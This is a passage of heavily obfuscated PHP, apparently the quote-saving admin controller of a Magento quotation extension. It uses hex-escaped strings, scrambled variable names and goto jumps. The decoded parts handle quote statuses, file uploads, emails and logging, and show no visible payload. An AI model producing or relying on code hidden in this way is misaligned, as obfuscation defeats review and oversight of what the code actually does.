$this->__("\123\x6f\155\x65\164\x68\x69\156\147\40\x77\x65\x6e\164\x20\167\x72\x6f\156\147\40\x77\x68\151\x6c\x65\40\144\165\x70\x6c\x69\143\x61\164\x69\x6e\x67\40\x74\x68\x69\x73\x20\x71\165\x6f\164\145"); goto GUN7Z; KOCDH: $ZSfZh = "\52\57\x2a\57\x65\x64\x69\x74\57\x69\x64\57" . $XELOl; goto a7saG; OKADu: Mage::log("\105\x78\143\x65\x70\164\151\157\156\72\40" . $Zf0h2->getMessage(), null, "\x63\62\x71\x5f\x65\170\x63\x65\160\x74\x69\157\x6e\x2e\154\x6f\147", true); goto TAGom; tZQtu: Mage::getSingleton("\141\144\x6d\151\x6e\150\x74\155\x6c\57\x73\145\163\x73\x69\x6f\156")->addError($WzFf2); goto A2QsD; GUN7Z: Mage::log("\105\x78\143\x65\160\164\151\157\156\72\40" . $WzFf2, null, "\x63\62\x71\x5f\145\170\x63\145\160\164\x69\157\156\56\154\157\x67", true); goto tZQtu; LARSc: } } public function saveAction() { goto xgT95; WvWyd: $KIRro = $this->getRequest()->getParam("\x65\166\145\156\164"); goto mfJ1i; cExns: try { goto SWYMm; KMxgs: return null; goto M3ZBT; uvKUb: eZkSU: goto sfzx4; X1vri: CwCPl: goto j76dy; RBQh0: if (!$FsnNf->getCustomerId()) { goto meFGK; } goto b8Gvn; G44a2: if (isset($XELOl)) { goto PXWyn; } goto u7iNP; DpIqH: O46AJ: goto E6krH; UDl0j: $R6f9I = $OJXHM->getRate($iXSSh->setProductClassId($SeGNy)); goto tQjvO; TKdvP: mcGrv: goto e6zOF; pFP0O: $KIRro = $this->getRequest()->getParam("\145\x76\145\x6e\x74"); goto aoWkg; SQMfN: $XELOl = (int) $this->getRequest()->getParam("\x69\144"); goto uZ9l3; HOyZp: Mage::log("\x4d\145\x73\163\141\147\145\x3a\x20" . $WzFf2, null, "\x63\x32\x71\56\154\x6f\x67"); goto MnUu8; aDZs3: Nj11I: goto TlgNu; vF_0t: ha33y: goto QRWVJ; vmRV1: HfdjR: goto phwgM; WM3k1: Mage::getSingleton("\141\144\x6d\151\156\150\164\155\154\x2f\x73\145\x73\x73\x69\157\156")->setFormData(false); goto G44a2; u_3bH: if (!isset($xOx3u["\x65\170\164\162\141\137\x6f\x70\x74\151\x6f\x6e\x73"])) { goto RErdi; } goto sbOqB; dDuaJ: $wxtEo = $FsnNf->getUserId(); goto lPbf8; e6zOF: Mage::getSingleton("\x61\x64\x6d\151\x6e\150\x74\155\x6c\x2f\x73\x65\x73\x73\x69\157\156")->addNotice($this->__("\x51\165\157\164\x65\x20\x77\141\x73\40\x73\141\166\145\144\40\167\151\164\150\40\x65\162\162\x6f\162\163")); goto EOGnQ; GGI3E: $FsnNf->collectTotals(); goto n8Igl; fOEnS: IDoku: goto bYQmH; ayIDw: $dgNOC = $this->getRequest()->getParam("\x65\x78\160\x69\162\x79"); goto hXt0M; ylalQ: if (!$ZXeg2) { goto N9s5K; } goto vww4B; WJsrz: MfkDG: goto ubY1G; SgJ2b: RqFlT: goto twjIo; ZEEf2: if ($OfZJu) { goto EhKsu; } goto tmoy2; in4GG: N9s5K: goto R2JnT; OK5uB: $FsnNf->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL); goto y9sm3; PO7pN: TLJX_: goto xP8AB; Z6QiZ: goto Nj11I; goto tE0ZR; Z7nTt: q2rBZ: goto Ee2KP; AzdWQ: bsb0k: goto G1s4M; Y9qaq: $FsnNf->setStatus($YdMff); goto v7EWA; Y8uoG: $FsnNf->setNoReminder($FuFu_); goto WMrbF; vs3c7: $FsnNf->setSubstatus($FsnNf->getStatus()); goto uvKUb; jjDje: $m41ti = Mage::app()->getLocale()->getDateFormat(Mage_Core_Model_Locale::FORMAT_TYPE_SHORT); goto ayIDw; fx7A3: X9j1x: goto l9dGT; Ben8P: if ($this->getRequest()->getParam("\x61\154\x74\137\x63\x68\x65\143\153\x6f\x75\164") == "\x6f\156") { goto RqFlT; } goto YNY40; drAro: $FsnNf->setData("\x61\154\x74\137\143\150\145\x63\153\157\x75\164", 0); goto sWP8P; eSmL0: $GOqOp = $FsnNf->getStoreId(); goto NztNG; FBuJu: RErdi: goto hme5B; W_S8J: tU1Sk: goto Jv94W; H26on: $OfZJu = $this->getRequest()->getParam("\x73\x61\154\145\x73\162\165\154\145"); goto ZEEf2; kRocr: $this->_sendProposalEmail($EY6wb, $YBSdJ, $FsnNf->getId()); goto q3Aip; hUWqj: UrA9q: goto Gdkym; sfzx4: $FsnNf->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL_SAVED); goto n797i; mu0cR: goto FT5FW; goto TsSg8; VE7KX: $FsnNf->setStatus($n28sO); goto yPpqU; r4Il8: $this->_redirect("\52\x2f\x2a\x2f\145\144\x69\x74", ["\x69\144" => $XELOl]); goto KMxgs; tmoy2: if (!($OfZJu !== null)) { goto P02yo; } goto TrWmD; AvhBg: if (!($R6f9I != $OpphN)) { goto tU1Sk; } goto G9BSM; DFePf: $JPu7B = Mage::app()->getLocale()->date($wF1KA, $m41ti, null, false); goto NbxNo; MnUu8: goto Ux66U; goto dmMDS; RjA0a: Mage::getSingleton("\x63\x6f\162\145\57\163\145\x73\x73\151\157\x6e")->setCollectTotals(669/669); goto cj3iA; jEx6l: $SeGNy = Mage::helper("\164\141\170")->getShippingTaxClass($lwkUi); goto YPy6t; Jhg98: $EBHXD = 0; goto GxHA4; jOvr2: if (is_object(Mage::app()->getWebsite(true))) { goto MFEOG; } goto Y1tCq; o2acy: ggGpk: goto bnseN; n1_zZ: X6rA5: goto GnCSo; coT3k: foreach ($xOx3u["\162\145\x71\165\145\x73\164\x65\x64\x70\x72\157\x64\165\x63\x74"] as $keIfv => $aTlta) { goto UTOkk; e3GLU: $apJrt = trim(strip_tags($izgdF)); goto X8mA5; X8mA5: try { goto X395q; OoTwu: $KAIEX = Mage::getModel("\x71\161\x75\x6f\x74\145\141\x64\x76\57\x72\145\161\x75\145\x73\164\151\164\145\x6d")->load($xPV8i); goto h9Tor; xNMHx: $N_E6E->save(); goto NlHEa; hfpNK: l4gvc: goto OoTwu; NIZAw: foreach ($xOx3u["\x70\x72\157\144\x75\143\164"] as $vLVkJ => $c3RCn) { goto p_Ho0; p_Ho0: if (!(in_array($vLVkJ, $xOx3u["\161\x32\x6f"]) && isset($c3RCn["\x72\145\x71\165\145\x73\164\145\x64\160\162\157\144\x75\x63\x74"]) && $c3RCn["\x72\145\161\x75\145\x73\164\x65\144\160\x72\157\144\x75\x63\164"] == $keIfv)) { goto OrKqV; } goto EwdYu; SC1aE: YVkfm: goto cbuiv; EwdYu: $xPV8i = $vLVkJ; goto p1OPE; p1OPE: OrKqV: goto SC1aE; cbuiv: } goto hfpNK; zV2O3: $N_E6E->setQty($vjztu); goto HXtAB; DLsb0: if (!$xOx3u["\x70\162\157\144\x75\x63\164"][$xPV8i]["\161\164\x79"]) { goto mgWEj; } goto AVv_E; IfZC4: $N_E6E->setAttribute(serialize($ONoXp)); goto zV2O3; V62jo: $ONoXp["\x71\x74\171"] = $vjztu; goto IfZC4; h9Tor: $N_E6E = Mage::getModel("\x71\x71\165\x6f\x74\x65\x61\x64\x76\x2f\161\161\141\x64\x76\160\162\157\x64\165\143\x74")->load($KAIEX->getQuoteadvProductId()); goto g3EAR; X395q: $xPV8i = $xOx3u["\x71\62\157"][$ZBvEY]; goto NIZAw; HXtAB: mgWEj: goto xNMHx; ERJy5: $ONoXp = unserialize($N_E6E->getAttribute()); goto V62jo; g3EAR: $N_E6E->setClientRequest($apJrt); goto DLsb0; AVv_E: $vjztu = $xOx3u["\x70\162\157\x64\165\143\x74"][$xPV8i]["\161\x74\171"]; goto ERJy5; NlHEa: } catch (Exception $Zf0h2) { goto pKF7R; pKF7R: if (!isset($KAIEX)) { goto X1c3p; } goto V_hCk; V_hCk: $hewCg[] = $this->__("\111\x74\x65\x6d\40\43\45\163\40\167\141\x73\47\x74\40\165\x70\144\141\164\x65\x64", $KAIEX->getProductId()); goto gjTxv; bRtyr: Mage::log("\x45\x78\143\145\x70\x74\x69\157\156\72\40" . $Zf0h2->getMessage(), null, "\x63\62\161\x5f\x65\170\x63\145\160\164\x69\x6f\x6e\x2e\154\157\x67", true); goto JhoLW; gjTxv: X1c3p: goto bRtyr; JhoLW: } goto wKr2d; naoIP: r3eF5: goto EDIBC; wKr2d: $ZBvEY++; goto naoIP; UTOkk: $izgdF = $aTlta["\143\154\151\x65\x6e\x74\x5f\x72\145\161\x75\x65\163\x74"]; goto e3GLU; EDIBC: } goto wrfxR; NbxNo: $FsnNf->setReminder($JPu7B->toString(Varien_Date::DATETIME_INTERNAL_FORMAT)); goto akjQp; GnCSo: if (!$this->getRequest()->getParam("\x62\141\x63\x6b")) { goto cB0wJ; } goto FNnl6; ZxnBO: GXxH7: goto uSyUk; NztNG: $AlP22 = Mage::helper("\164\141\170")->shippingPriceIncludesTax($GOqOp); goto WT8Zh; Vyuew: $FsnNf->setSalesrule($OfZJu); goto BT6WS; eNJYr: QI2qo: goto UNb5T; hXt0M: if (!$dgNOC) { goto ggGpk; } goto SItNL; AonCx: Ux66U: goto XtuqA; UNb5T: $QrFxX->checkUnholdStatus($FsnNf); goto ZI5VD; Z2GU3: $Xdxmz = Mage::app()->getLocale()->date($eLHd4, $m41ti, null, false); goto tkMt_; GxHA4: foreach ($_FILES as $JAjfq) { goto Yj9WM; JedHO: $EBHXD++; goto eqrv0; yEvAl: $FsnNf->uploadFile($oiBsl, "\146\151\154\145\x5f\x70\x61\x74\150\x5f" . $EBHXD); goto JedHO; eqrv0: OjKFb: goto o_Cxn; Yj9WM: $oiBsl = $this->getRequest()->getParam("\146\x69\x6c\145\x5f\x74\151\164\x6c\x65\137" . $EBHXD); goto yEvAl; o_Cxn: } goto rdzJ8; SItNL: $iVYxS = Mage::app()->getLocale()->date($dgNOC, $m41ti, null, false); goto QpItl; u7iNP: $this->_redirect("\x2a\x2f\x2a\x2f"); goto NQbNf; piFdP: kXp31: goto VvThk; NKrP3: $Wq6rX = $this->getRequest()->getParam("\150\157\154\x64"); goto RCCGu; j2Mba: YOtMt: goto rVwVm; uj1t3: if (!($EnY48 == 433/433)) { goto GXxH7; } goto bC0vO; un3uM: HUIGj: goto Gd0Up; wrfxR: Pj8Qv: goto kpLb7; Vmo13: $FsnNf->setClientRequest($apJrt); goto p8sJa; uSyUk: if ($this->getRequest()->getParam("\151\x74\x65\x6d\x70\162\151\x63\145") == "\157\x6e") { goto q2rBZ; } goto Oo7gO; SWYMm: if (!(isset($xOx3u["\x70\162\157\x64\x75\x63\x74"]) && is_array($xOx3u["\x70\x72\157\x64\x75\143\x74"]) && count($xOx3u["\x70\162\157\144\x75\143\164"]) > 0)) { goto KjjNI; } goto SQMfN; h8y2j: $KDoHW = $this->getRequest()->getPost("\163\150\x69\x70\160\x69\156\147\137\x74\x79\160\145", ''); goto TnZ9m; k3fsW: $Mb8bP = Mage::getSingleton("\141\x64\155\151\156\57\x73\x65\x73\x73\x69\x6f\156")->getUser()->getId(); goto Q7TyB; s_3MO: jqOx4: goto U7Lz1; x7d9M: $MgycB = $FsnNf->getUserId(); goto K2GaQ; XVXw4: $this->setFlag("\x71\x71\165\x6f\164\145\141\x64\166", "\x70\x72\x69\x6e\164", false); goto BYVh0; dDkyk: SwwB7: goto w4U5R; BeHHy: $FsnNf->setStatus($YdMff); goto Ptvjb; Ho0sW: if ($izgdF) { goto O46AJ; } goto ATUpP; Qo93M: $dUTNC = $this->getRequest()->getParam("\x69\x6e\164\145\x72\x6e\x61\x6c\137\143\157\155\x6d\x65\156\164"); goto a1cPd; rdzJ8: qzA1Q: goto JLt3B; NbcjH: EhKsu: goto Vyuew; aDqIk: Pxl7m: goto WwAX_; hme5B: if (!isset($xOx3u["\x73\x74\157\x72\145"])) { goto NogZH; } goto YBN_G; oFlnm: $FsnNf->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_REQUEST); goto k8cX9; QQSdF: $FsnNf->setInternalComment(); goto yENBh; VJBHo: if (!(!$uw2vN->getId() && isset($vuQ04) && $vuQ04)) { goto HfdjR; } goto k3fsW; HFp5Q: $SUp8f = Mage::getModel("\x61\144\155\151\x6e\57\x75\x73\x65\x72")->load($ZXeg2->getAssignedSalesRep()); goto JV0PU; CGqqX: HKDoI: goto ozchj; tslC6: M8mqd: goto vF_0t; lx0IL: $KIRro = $this->getRequest()->getParam("\145\166\x65\x6e\x74"); goto f5naD; lHP87: $this->_redirect("\x2a\57\52\57\x65\144\151\164", ["\x69\144" => $XELOl]); goto Ksw9w; Htvmm: Mage::dispatchEvent("\x71\x71\165\x6f\x74\145\141\144\x76\x5f\161\161\x61\144\166\143\165\x73\x74\157\155\x65\162\137\141\146\164\x65\162\x73\141\x76\145\x5f\x66\x69\x6e\x61\x6c\137\163\165\x63\x63\x65\163\x73", ["\161\x75\157\x74\x65" => $FsnNf]); goto kO4ud; FK0c6: $YdMff = Mage::getModel("\x71\x71\x75\157\x74\x65\141\x64\x76\57\x73\165\x62\163\164\141\164\165\163")->getStatus($FsnNf->getSubstatus()); goto ZMF1_; BYVh0: unset($this->ybeW8); goto wZL1C; pgg9g: Mage::getSingleton("\141\144\155\151\x6e\x68\164\155\154\x2f\x73\145\x73\x73\151\157\156")->addSuccess($this->__("\121\x75\x6f\x74\145\x20\x77\141\163\x20\x73\x75\143\x63\x65\x73\x73\x66\165\154\x6c\171\40\163\141\x76\x65\x64")); goto Htvmm; kpLb7: HaSJi: goto Jhg98; Hu4rP: zASIK: goto u_3bH; bYQmH: Z44YB: goto WM3k1; vROiR: cB0wJ: goto NKrP3; bC0vO: $FsnNf->setFollowup(); goto I66QI; pttaU: if (!(Mage::getStoreConfig("\x71\x71\x75\x6f\164\x65\x61\144\166\137\x71\165\157\x74\145\x5f\x63\x6f\156\146\x69\x67\165\x72\x61\x74\151\x6f\156\x2f\x70\162\x6f\x70\x6f\x73\141\x6c\x2f\x70\162\x6f\x66\151\164", $FsnNf->getData("\163\164\x6f\162\145\x5f\151\144")) != 166/166)) { goto LUU3C; } goto Wxbfj; wQhMQ: dBGBa: goto FBuJu; a0P1A: Mage::getSingleton("\141\144\x6d\x69\156\150\164\155\x6c\57\163\x65\163\x73\x69\x6f\x6e")->addNotice($this->__("\120\x72\x6f\160\157\163\141\154\40\x77\x61\x73\x20\x6e\x6f\164\x20\x73\x65\x6e\x74\x2c\40\156\157\x20\x70\162\x6f\146\x69\x74")); goto r4Il8; UbKUa: ChNNb: goto GlVQ0; dmMDS: MFEOG: goto cTubA; G0KXa: $EnY48 = $this->getRequest()->getParam("\x6e\x6f\137\146\157\x6c\154\157\x77\x75\x70") && $this->getRequest()->getParam("\156\157\x5f\x66\157\154\x6c\x6f\x77\165\160") == "\157\x6e" ? 246/246 : 0; goto uj1t3; dlJvx: QBjNs: goto x2fsL; GU2fj: if (!$KIRro) { goto ChNNb; } goto VNLKS; YBN_G: $FsnNf->setStoreId($xOx3u["\x73\164\x6f\x72\x65"]); goto wES1h; ZMF1_: $hh1aj = Mage::getModel("\x71\161\x75\x6f\164\x65\141\x64\x76\x2f\x73\165\142\163\x74\x61\x74\x75\163")->getSubstatus($FsnNf->getSubstatus()); goto B1tGc; v7EWA: $FsnNf->setSubstatus($hh1aj); goto PbQZh; RRQbp: rS7jj: goto tslC6; SXAkm: if (!$KIRro) { goto IDoku; } goto R4WYM; WMrbF: $eLHd4 = $this->getRequest()->getParam("\x66\157\154\x6c\x6f\x77\x75\160"); goto PAP8x; f05IH: if ($XELOl) { goto MfkDG; } goto CA62W; DOS13: if (count(Mage::getSingleton("\141\x64\x6d\151\156\x68\164\x6d\x6c\57\x73\x65\163\163\x69\x6f\156")->getMessages()->getErrors())) { goto mcGrv; } goto pgg9g; ayRvm: $this->sendEmailSalesRep($FsnNf, $SUp8f); goto dDkyk; TrWmD: if (!($FsnNf->getSalesrule() != null)) { goto Arr44; } goto IYEN4; AA13s: $KIRro = $this->getRequest()->getParam("\145\x76\145\x6e\164"); goto SXAkm; Oo7gO: $FsnNf->setData("\x69\164\145\x6d\160\x72\151\143\x65", 0); goto m5JP7; QRWVJ: KjjNI: goto bvqGv; phwgM: goto jqOx4; goto SIXJs; mWjEr: $SeGNy = Mage::helper("\x74\x61\x78")->getShippingTaxClass($lwkUi); goto UDl0j; zGX1U: Mage::getSingleton("\x61\144\155\x69\x6e\150\x74\x6d\154\57\x73\x65\163\163\x69\x6f\156")->addError($this->__("\103\x6f\x75\x6c\144\x20\x6e\x6f\x74\40\146\151\x6e\x64\40\x75\x73\145\x72\x20\x77\x69\x74\x68\40\151\x64\72\40\x25\x73", $BJOGM)); goto lOxrL; DuIFh: $FsnNf->setUserId($Mb8bP); goto s_3MO; qskCg: foreach ($xOx3u["\160\162\157\x64\x75\143\x74"] as $vuQ04 => $TvbdQ) { goto Mmml8; UoYoN: $PHRyZ = $hZzDN; goto D7ilg; NrBok: goto x9ce1; goto Dn7w8; GZ70W: S6JU2: goto QFlqe; UfRYy: foreach ($hewCg as $WzFf2) { goto Zv18a; LjXjb: sZanZ: goto BI3WP; QbR8E: Mage::getSingleton("\x61\144\x6d\151\x6e\x68\164\155\154\57\163\x65\163\163\x69\157\156")->addError("\x3c\142\x72\40\57\76" . $WzFf2); goto vBz5n; qsDub: $FclWo = $WzFf2; goto LjXjb; Zv18a: if (!($WzFf2 != $FclWo)) { goto fc9jt; } goto P4Mq6; vBz5n: fc9jt: goto qsDub; P4Mq6: $WzFf2 .= $this->__("\x51\x75\x6f\164\145\x20\x63\x6f\165\154\x64\x20\156\x6f\164\40\x62\x65\40\x73\x61\x76\x65\144\56"); goto QbR8E; BI3WP: } goto ZO7it; KX1Cp: $FclWo = null; goto UfRYy; WdO9D: try { goto TZBO4; y7zQk: $ZkDTt = $IZwBM / $mdGp7; goto e1ML2; TZBO4: $uw2vN->setOwnerCurPrice($IZwBM); goto y7zQk; e1ML2: $uw2vN->setOwnerBasePrice($ZkDTt); goto Yedwm; Yedwm: $uw2vN->save(); goto oJm4A; oJm4A: } catch (Exception $Zf0h2) { $hewCg[] = $this->__("\111\x74\145\155\x20\x23\x25\x73\40\167\141\x73\47\164\x20\x75\160\x64\x61\x74\x65\144", $vuQ04); Mage::log("\x45\x78\x63\145\160\x74\151\x6f\156\x3a\40" . $Zf0h2->getMessage(), null, "\143\62\161\x5f\145\170\x63\145\160\x74\151\x6f\156\x2e\x6c\157\147", true); } goto yVHCf; yVHCf: bV563: goto JnKmN; AhoyH: goto nsWXV; goto xvhLw; xvhLw: IBkB0: goto RvKlX; MEZYY: $uw2vN = Mage::getModel("\x71\161\165\157\164\145\141\144\166\57\x72\145\x71\x75\x65\163\x74\x69\164\x65\155")->load($vuQ04); goto iZ6Gw; RvKlX: return $hewCg; goto P7EKp; QFlqe: t6_0s: goto mkuvI; HmLXT: $GT4Jc[] = $kw2RS; goto Wievn; kNSbV: x9ce1: goto AhoyH; MXGX0: na3tH: goto WdO9D; SQXxi: $kw2RS = Mage::getModel("\x71\x71\x75\x6f\x74\145\141\144\166\57\x71\x71\x61\x64\x76\160\x72\x6f\x64\165\x63\164")->getQuoteItemChildren((int) $sRb87, $uw2vN->getQuoteadvProductId()); goto UoYoN; BEDEP: $hewCg = $zjhFp->getErrors(); goto dj5WF; NG98j: if (!count($hewCg)) { goto aSwQ0; } goto KX1Cp; Wievn: if (!(isset($kw2RS) && is_object($kw2RS))) { goto t6_0s; } goto GHZDa; mkuvI: foreach ($GT4Jc as $zHD6H) { goto S3k8I; d1BZz: $zjhFp = Mage::helper("\161\161\165\157\x74\145\141\144\166")->isQuoteable($zHD6H, $PHRyZ); goto lUePe; lUePe: ktq86: goto omehb; VgAII: cfvyz: goto gb6Tl; dKWiJ: GNx71: goto d1BZz; gb6Tl: Og293: goto dKWiJ; j_Mtw: $PHRyZ = $zHD6H->getQuoteItemQty(); goto U6Uih; U6Uih: if (!is_array($PHRyZ)) { goto Og293; } goto BFSA1; S3k8I: if (!$zHD6H->getQuoteItemQty()) { goto GNx71; } goto j_Mtw; BFSA1: foreach ($PHRyZ as $pnm92) { goto coQOl; ARNfq: goto cfvyz; goto aVYsa; aVYsa: ENSMZ: goto ABbwM; coQOl: $PHRyZ = $pnm92; goto ARNfq; ABbwM: } goto VgAII; omehb: } goto Jkm0P; Mmml8: $IZwBM = $TvbdQ["\160\x72\x69\143\145"]; goto PsB9T; PsB9T: $hZzDN = $TvbdQ["\161\164\x79"]; goto MEZYY; GHZDa: if (!$kw2RS->getChildren()) { goto S6JU2; } goto EINYJ; ZO7it: f4pPV: goto BSUKM; FMgqe: if (isset($XELOl) && isset($xOx3u["\162\x65\x64\x69\x72\x65\x63\164\62\x6e\145\167\157\x72\144\145\x72"]) && $xOx3u["\162\145\144\151\162\145\143\164\62\156\145\x77\157\162\144\x65\162"] == 507/507) { goto fefQr; } goto UB0jD; Dn7w8: fefQr: goto Bx_zY; iZ6Gw: $sRb87 = $uw2vN->getProductId(); goto SQXxi; Jkm0P: xMP54: goto RX2Pu; dj5WF: if ($OxkQg === true) { goto IBkB0; } goto NG98j; P7EKp: nsWXV: goto MXGX0; Bx_zY: foreach ($hewCg as $WzFf2) { Mage::log("\x4d\145\x73\163\x61\147\x65\x3a\40" . $WzFf2, null, "\143\x32\161\x2e\154\157\x67"); jJW4O: } goto vQKJL; RX2Pu: if (!(isset($zjhFp) && $zjhFp->getHasErrors())) { goto na3tH; } goto BEDEP; D7ilg: $GT4Jc = []; goto HmLXT; UB0jD: return $this->_redirect("\52\57\52\57\145\144\151\164", ["\151\x64" => $XELOl]); goto NrBok; vQKJL: B3fUJ: goto kNSbV; EINYJ: $GT4Jc = array_merge($GT4Jc, $kw2RS->getChildren()); goto GZ70W; BSUKM: aSwQ0: goto FMgqe; JnKmN: } goto PO7pN; WT8Zh: if (!$AlP22) { goto TP6y4; } goto jOvr2; TnZ9m: $mbQM0 = $this->getRequest()->getPost("\x73\x68\x69\x70\160\151\156\147\x5f\160\162\x69\143\145", -371/371); goto eSmL0; RCCGu: if (!$Wq6rX) { goto M8mqd; } goto GdXJ6; fAHlx: $FuFu_ = $this->getRequest()->getParam("\x6e\157\x5f\162\x65\155\151\156\x64\145\x72") && $this->getRequest()->getParam("\x6e\157\137\x72\145\155\151\156\x64\145\162") == "\x6f\156" ? 641/641 : 0; goto Y8uoG; GlVQ0: goto Z44YB; goto TKdvP; kO4ud: $KIRro = $this->getRequest()->getParam("\145\x76\145\x6e\x74"); goto GU2fj; SIXJs: Anv6_: goto rJjop; rVwVm: $n28sO = $FsnNf->getStatus(); goto cjnLo; Ag_cE: $FsnNf->save(); goto MZkam; rj_bS: D6RNJ: goto x7d9M; jIZHD: $izgdF = $this->getRequest()->getParam("\143\x6c\151\145\156\x74\x5f\x72\x65\161\x75\x65\x73\x74"); goto Ho0sW; Taomv: Mage::register("\x71\161\x75\157\x74\x65\x61\144\166", $FsnNf); goto kRocr; gFUbH: LUU3C: goto rQu_B; tkMt_: $FsnNf->setFollowup($Xdxmz->toString(Varien_Date::DATETIME_INTERNAL_FORMAT)); goto NVCZl; Uz5v3: $WzFf2 = "\x4d\141\147\x65\72\72\x61\x70\160\50\x29\55\x3e\147\x65\164\127\x65\x62\163\151\x74\x65\50\164\162\165\145\x29\x20\151\x73\x20\156\157\x74\40\x61\x20\157\x62\152\145\x63\x74\x2c\40\x66\141\x6c\154\x62\141\x63\x6b\40\x61\160\x70\x6c\151\x65\x64"; goto HOyZp; tQjvO: $y73fm = Mage::getModel("\x63\x6f\162\145\57\x73\164\x6f\x72\145")->load($GOqOp); goto CYEmg; j76dy: RKjRS: goto ZJyoS; q3Aip: Mage::unregister("\x71\161\x75\x6f\164\145\x61\x64\166"); goto oUCx5; KQfiu: $xOx3u["\145\170\164\162\141\137\157\x70\x74\x69\x6f\156\163"] = [$xOx3u["\x65\x78\x74\x72\x61\x5f\x6f\160\x74\151\157\x6e\x73"]]; goto un3uM; fCJ3m: Mage::dispatchEvent("\x71\161\165\x6f\164\x65\x61\x64\166\137\161\161\141\x64\x76\x63\x75\x73\x74\x6f\155\145\x72\137\141\146\x74\145\162\163\x61\x76\145\137\146\151\156\141\154\x5f" . $KIRro, ["\x71\165\x6f\x74\145" => $FsnNf]); goto UIJ5d; GdXJ6: if ($Wq6rX == 682/682) { goto tKDRy; } goto uw4uL; MHdc6: $mdGp7 = $FsnNf->getBase2QuoteRate(); goto nPZFe; KlXuI: Arr44: goto oXxES; l_AiA: $ZXeg2 = $FsnNf->getCustomer(); goto ylalQ; lOxrL: $SUp8f = Mage::getSingleton("\x61\144\155\x69\156\57\x73\x65\163\x73\x69\157\x6e")->getUser(); goto ddcHP; ATUpP: $FsnNf->setClientRequest(); goto dp65i; twjIo: $FsnNf->setData("\x61\x6c\x74\x5f\x63\x68\145\x63\153\157\x75\x74", 813/813); goto mu0cR; m5JP7: goto bVnwE; goto Z7nTt; ZWSaZ: Mage::dispatchEvent("\161\x71\x75\x6f\164\x65\141\x64\166\137\x71\x71\x61\144\x76\x63\165\x73\164\x6f\155\x65\x72\x5f\x62\145\x66\157\x72\145\x5f\163\141\x76\x65\141\x63\164\x69\157\156\x5f" . $KIRro, ["\x71\x75\x6f\164\145" => $FsnNf]); goto Hu4rP; UIJ5d: Mage::dispatchEvent("\161\161\x75\157\164\145\x61\x64\166\137\x71\x71\x61\x64\166\x63\x75\163\164\157\155\145\162\x5f\x62\145\146\x6f\162\x65\x5f\x73\141\166\x65\x61\143\x74\151\x6f\156\137" . $KIRro, ["\x71\165\x6f\164\145" => $FsnNf]); goto RRQbp; HMihu: $FsnNf->setShippingPrice($mbQM0); goto bd202; rhnwO: $SUp8f = Mage::getSingleton("\x61\x64\x6d\x69\156\x2f\x73\x65\x73\x73\151\157\156")->getUser(); goto lEDL9; U7Lz1: if (Mage::getSingleton("\141\144\x6d\x69\156\57\x73\145\x73\163\151\157\156")->isAllowed("\163\x61\x6c\x65\163\x2f\x71\x71\165\x6f\x74\145\x61\x64\166\57\x73\141\154\145\x73\162\x65\x70")) { goto HKDoI; } goto R3sMX; nrt9U: $wF1KA = $this->getRequest()->getParam("\162\145\x6d\x69\x6e\144\x65\162"); goto Fcmrp; v_l0T: $hewCg = []; goto uwuId; IiGvy: goto CwCPl; goto WJsrz; xxt5f: $FsnNf->collectTotals(); goto fPumf; M3ZBT: sgshx: goto gFUbH; uw4uL: if ($Wq6rX == 614/307) { goto Pxl7m; } goto Z6QiZ; CA62W: $FsnNf = $this->getQuotationQuote(); goto IiGvy; CYEmg: $OJXHM = Mage::getModel("\x74\x61\170\x2f\x63\x61\x6c\x63\165\x6c\141\164\x69\157\x6e"); goto LPzZc; K2GaQ: $FsnNf->setUserId($SUp8f->getUserId()); goto h8y2j; J_5Ea: $zQ626 = $zQ626 * ((47500/475 + $OpphN) / 37500/375); goto suljp; Q7TyB: $FsnNf->setUserId($Mb8bP); goto vmRV1; tEPOs: $this->_redirectAnhcor("\x2a\x2f\x2a\57\x65\x64\x69\164", ["\x69\144" => $XELOl], "\x23\x70\x72\157\144\165\x63\164\163"); goto RjA0a; B1tGc: if ($QrFxX) { goto QI2qo; } goto V9in_; oUCx5: xMBOv: goto vROiR; LPzZc: $ZXeg2 = $FsnNf->getCustomer(); goto prtln; FWo05: if ($this->getRequest()->getParam("\x62\141\x63\153")) { goto YOtMt; } goto mU3OM; GM85z: bVnwE: goto Ben8P; WwAX_: $QrFxX = Mage::getModel("\161\x71\165\x6f\164\145\141\x64\166\x2f\x73\x75\142\163\x74\x61\x74\x75\163")->getStatuses($FsnNf->getSubstatus()); goto FK0c6; U33NV: CubNS: goto lHP87; F3PmJ: $YdMff = Mage::getModel("\161\x71\x75\157\x74\x65\x61\x64\166\57\x73\x75\x62\163\164\x61\164\x75\163")->getStatus($xOx3u["\x73\x74\x61\164\x75\163"]); goto mS1Sl; Myapt: $JOkCi = trim(strip_tags($dUTNC)); goto Py4bz; xP8AB: if (!(is_array($xOx3u["\x72\145\161\165\145\x73\x74\145\x64\x70\162\x6f\144\165\143\x74"]) && count($xOx3u["\162\145\161\165\x65\163\x74\x65\144\x70\x72\x6f\144\x75\143\164"]) > 0)) { goto HaSJi; } goto v_l0T; DCqCy: $FsnNf->setUpdatedAt(Mage::getSingleton("\143\157\162\x65\x2f\144\x61\164\x65")->gmtDate()); goto dDuaJ; E6krH: $apJrt = trim(strip_tags($izgdF)); goto Vmo13; TlgNu: $FsnNf->save(); goto qiUOh; bd202: $rbt16 = $mbQM0 / $mdGp7; goto Bhib0; JV0PU: C_EeT: goto piFdP; mU3OM: if (!$this->getRequest()->getParam("\x68\157\154\144")) { goto bKF6V; } goto JtuoX; suljp: $zQ626 = 18100/181 / $zQ626; goto AiSvH; G1s4M: return null; goto eVyj7; YNY40: if (Mage::getStoreConfig("\161\161\165\157\164\x65\141\x64\x76\137\141\144\166\141\156\x63\x65\144\137\163\x65\x74\164\151\156\147\x73\57\x63\150\145\x63\153\157\x75\164\x2f\143\x68\x65\143\x6b\157\165\164\x5f\141\154\x74\145\162\156\x61\164\151\x76\x65", $FsnNf->getData("\x73\164\x6f\162\x65\x5f\x69\144")) > 0) { goto zTB0F; } goto drAro; uZ9l3: if (!$XELOl) { goto ha33y; } goto jnjY5; Gdkym: if (!isset($xOx3u["\163\x74\x61\x74\x75\x73"])) { goto QcPUu; } goto FWo05; wZL1C: return $this; goto n1_zZ; QpItl: $FsnNf->setExpiry($iVYxS->toString(Varien_Date::DATETIME_INTERNAL_FORMAT)); goto o2acy; YcFEb: goto ZTGML; goto GSLvp; rQu_B: $YBSdJ = $FsnNf->getIncrementId() ? $FsnNf->getIncrementId() : 